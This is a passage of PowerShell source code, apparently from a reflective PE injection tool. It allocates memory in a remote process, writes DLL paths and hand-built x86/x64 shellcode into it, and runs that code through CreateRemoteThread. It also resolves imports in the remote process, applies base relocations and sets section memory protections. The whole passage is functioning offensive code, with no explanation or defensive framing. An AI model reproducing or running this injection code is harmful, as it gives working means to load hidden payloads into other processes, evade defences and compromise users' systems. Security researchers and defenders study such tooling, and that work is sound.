        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw ""Unable to allocate memory in the remote process""
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw ""Unable to write DLL path to remote process memory""
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw ""Didn't write the expected amount of bytes when writing a DLL path to load to the remote process""
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""LoadLibraryA"") 
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw ""Unable to allocate memory in the remote process for the return value of LoadLibraryA""
            }
            
            
            
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw ""Unable to allocate memory in the remote process for shellcode""
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw ""Unable to write shellcode to remote process memory.""
            }
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
            }
            
            
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw ""Call to ReadProcessMemory failed""
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw ""Call to GetExitCodeThread failed""
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   
        
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw ""Unable to allocate memory in the remote process""
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw ""Unable to write DLL path to remote process memory""
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw ""Didn't write the expected amount of bytes when writing a DLL path to load to the remote process""
            }
        }
        
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
        
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""GetProcAddress"") 

        
        
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw ""Unable to allocate memory in the remote process for the return value of GetProcAddress""
        }
        
        
        
        
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw ""Unable to allocate memory in the remote process for shellcode""
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw ""Unable to write shellcode to remote process memory.""
        }
        
        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
        }
        
        
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw ""Call to ReadProcessMemory failed""
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            
            
            
            
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString ""Copy-Sections::MarshalCopy"" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString ""Copy-Sections::Memset"" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true 
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                
                
                
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {           
                    
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }               

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    
                    Throw ""Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo""
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose ""Done importing DLL imports""
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                Write-Verbose ""Importing $ImportDllPath""
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                    
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                    
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw ""Error importing DLL, DLLName: $ImportDllPath""
                }
                
                
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) 
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    
                    
                    
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff 
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff 
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                        
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw ""New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath""
                        }
                        else
                        {
                            Throw ""New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath""
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    
                    
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString ""Update-MemoryProtectionFlags::VirtualProtect"" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw ""Unable to change memory protection""
            }
        }
    }
    
    
    
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
